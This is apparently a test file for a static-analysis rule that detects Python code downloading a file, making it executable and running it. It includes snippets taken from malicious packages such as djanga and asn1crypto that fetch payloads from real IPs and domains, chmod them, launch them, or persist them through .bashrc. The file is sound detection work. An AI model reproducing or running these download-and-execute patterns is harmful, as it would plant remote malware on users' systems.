""" Tests for download-executable rule

    OK cases:
        - download file without executable permissions 
    RULEID cases:
        - djanga
        - asn1crypto
"""


""" OK: download file without executable permissions
"""
def f():
    # ok: download-executable
    output = open("./outputs/" + title + ".py", "w+", encoding="utf-8")
    output.write("import utils\n")


""" RULEID: djanga malware
"""
def f():
    PATH = "/out"
    IP = "145.249.104.71"
    LOC = ".drv"
    if not s:
        response = urllib2.urlopen("http://" + IP + PATH).read()
    else:
        connection = http.client.HTTPConnection(IP)
        connection.request("GET", PATH)
        response = connecton.getresponse().read()
    os.chdir(os.path.expanduser("~"))
    d = open(LOC, "wb")
    # ruleid: download-executable
    d.write(response)
    d.close()
    current_state = os.stat(LOC)
    os.chmod(LOC, current_state.st_mode | stat.S_IEXEC)
    brc = open(".bashrc", "a")
    brc.write("\n~/.drv &")
    brc.close()


""" RULEID: asn1crypto malware
"""
def f():
    if condiment and condiment != "0.0.0.0":
        narcohypnosis = urlopen("http://" + condiment + "/mainprise").read()
        # ruleid: download-executable
        with open("/tmp/reloan", "wb") as colmar:
            colmar.write(narcohypnosis)
        os.chmod("/tmp/reloan", 777)
        subprocess.call("/tmp/reloan")

""" RULEID: Detect requests
"""
def f():
    url = 'http://35.235.126.33/executable.exe'
    req = requests.get(url)
    # ruleid: download-executable
    with open(executable, 'wb') as f:
        f.write(req.content)
    if 'linux' in operating_system or 'darwin' in operating_system:
        os.system(f"chmod +x {executable}")

""" RULEID: Simple download + file creation
"""
def f():
    response = requests.get(URL)
    # ruleid: download-executable
    open(executable1, "wb").write(response.content)
    os.system(f"chmod +x {executable1}")

def f():
    response = requests.get(URL)
    # ruleid: download-executable
    open(executable2, "wb").write(response.content)
    os.system(f'set __COMPACT_LAYER=RunAsInvoker | start +x {executable2}')


""" RULE ID: Detect urlretrieve of exe
"""
def f():
    # ruleid: download-executable
    urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.exe")
    Popen(['normal.exe'])

""" OK: download regular file
"""
def f():
    # ok: download-executable
    urllib.request.urlretrieve("https://wwww.google.com/robots.txt", "robots.txt")

""" RULE ID: Detect urlretrieve and rename to exe
"""
def f():
    # ruleid: download-executable
    urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.dat")
    os.rename("normal.dat", "normal.exe")

""" OK: download and rename of regular file
"""
def f():
    # ok: download-executable
    urllib.request.urlretrieve("https://www.google.com/robots.txt", "robots.txt")
    os.rename("robots.txt", "roboto.txt")

""" RULE ID: Downloads and creates an .exe
"""
def f():
    import os
    import requests
   
    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
    response = requests.get(URL)
    # ruleid: download-executable
    open("exo.exe", "wb").write(response.content)
    os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")

""" OK: Downloads harmless file and references it
"""
def f():
    import os
    import requests
   
    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
    response = requests.get(URL)
    # ok: download-executable
    open("exo.txt", "wb").write(response.content)
    os.system("echo exo.txt")

def f():
    for executable in all_executables:
        url = f'http://35.235.126[.]33/{executable}'
        req = requests.get(url)
        # ruleid: download-executable
        with open(executable, 'wb') as f:
            f.write(req.content)

        if 'linux' in operating_system or 'darwin' in operating_system:
            os.system(f'chmod +x {executable}')

        if 'linux' in operating_system:
            os.system(f'./{executable} &')
        elif 'darwin' in operating_system:
            os.system(f'./{executable} &')
        elif 'windows' in operating_system:
            os.system(f'start /B {executable}')
